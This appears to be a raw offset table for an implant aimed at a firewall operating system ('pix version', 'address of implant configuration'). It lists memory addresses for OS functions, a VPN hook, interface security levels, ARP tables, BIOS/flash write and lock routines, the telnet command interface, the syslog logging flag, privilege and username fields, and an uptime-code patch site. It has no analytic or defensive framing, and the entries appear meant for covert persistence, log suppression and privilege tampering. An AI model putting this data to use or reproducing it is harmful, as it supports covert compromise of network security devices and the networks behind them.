; --- SECTION I ---
;
0x635            // pix version
0x1fd000              // address of implant configuration
0x0   0x00100db8      // allocb
0x1   0x00100f94      // freeb
0x2   0x0010160c      // open
0x3   0x001f248c      // put
0x4   0x001016a0      // close
0x5   0x004e91f8      // atoip
0x6   0x004daa38      // memset
0x7   0x004deb08      // memcpy
0x8   0x004dc7c0      // malloc
0x9   0x004dcedc      // free
0xa   0x001026a0      // printf
0xb   0x004cb6a0      // des_encrypt
0xc   0x004e72b0      // isprint
0xd   0x004cc180      // des_set_key
0xe   0x0024094c      // sha (pre-631)/sha1
0xf   0x003ff2bc      // rand
0x15  0x00103c38      // process_create
0x16  0x00104928      // process_suspend
0x17  0x00104a54      // process_sleep_for
0x18  0x004bd078      // show_process
0x19  0x0010525c      // bark
0x1a  0x0056ed24      // cur_t
0x2a  0x38            // rptr structure offset
0x2b  0x40            // wptr structure offset
0x2c  0x10            // inIfc (incoming interface) structure offset
0x2d  0x00303b98      // vpn hook
0x2e  0x34            // vpn munge offset
0x30  0x00581174      // address of interface 0 security level
0x31  0x00581178      // address of interface 0 name
0x32  0x00581154      // address of interface 0 IP
0x33  0x2d8           // length of interface struct
0x34  0x005ec228      // max number of interface cards
0x35  0x005ec230      // internal_clock
0x36  0x00576998      // addr of flash structure
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
InterfaceAddr       0x00581154      // matches entry 0x32 above
InterfaceLeng       0x1c70          // 10 times entry 0x33 above
IntSecurityOffset   0x20            // security level field offset
IntNameOffset       0x24            // interface name field offset
FlashClassAddr      0x00576998      // addr of flash structure
CryptoDeviceAddr    0x00537d78      // addr of crypto structure
ArpTableAddrPtr     0x00520ca4      // addr of first entry in ARP table
ArpTableLastPtr     0x00520cac      // addr of last entry in ARP table
NumInterfaces       0x00580c40      // addr of pointer to number of interfaces
IfaceStruct2        0x0057c838      // addr of pointer to second smaller interface struct
IfaceStruct2Len     0xa8            // length of 2nd smaller interface struct used by arp cache
BiosClassAddr       0x00576960      // addr of the bios class structure
BiosWriteAddr1      0x001acac4      // addr of the bios write function for one specific bios
BiosWriteAddr2      0x001b1574      // addr of the bios write function for one specific bios
BiosWriteAddr3      0x001b1c94      // addr of the bios write function for one specific bios
BiosWriteAddr4      0x001b3958      // addr of the bios write function for one specific bios
BiosWriteAddr5      0x001b41ac      // addr of the bios write function for one specific bios
BiosWriteOffset     0x00000020      // offset into the bios structure where write addr is located
BiosReadE28F6       0x001b3e38      // addr of the bios read function for e28f640j3 chip
BiosLockE28F6       0x001b43b8      // addr of the bios block lock/unlock function for e28f640j3 chip
AnnounceFunc        0x001015bc      // addr of the device announce function
DevIoctlOffset      0x00000070      // offset to the ioctl function in a device structure
CIStartFunc         0x00107fd8      // addr of the command interface start function -- telnet function
CommandListAddr     0x00522fbc      // addr of the command list -- first parameter of ci
DeviceListPtrAddr   0x00537bf8      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset 0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr      0x004e63b8      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr   0x0052cc84      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue         0x85b00001      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue        0x85b00002      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue         0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset         0x54            // Offset into a thread struct containing the stdch pointer
StdErrOffset        0x58            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset      0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset         0x14            // offset into an environment struct containing the username 
EnvPtrOffset        0x5c            // offset into a thread struct containing the pointer to the environment struct  
Open                0x0010160c      // channel open
WatchDogTimeout     0x0051041c      // Address where the thread timeout value is stored 
UpTimeCounter       0x0056e4e8      // Address of the up time counter
Get_uptime_secs_addr            0x004ed2a0  // Address of the function that fetches the uptime
Modified_getuptime_code_addr    0x004c6540  // Address to the next nearest 20 nops
Get_uptime_secs_call_instr_addr 0x004c5e3d  // Address of the location of the get_uptime_secs call instruction
AvailMemoryPtr      0x0056ed74      // Address of total available memory
;
; --- END OF SECTION II ---
;
:EOS:
;
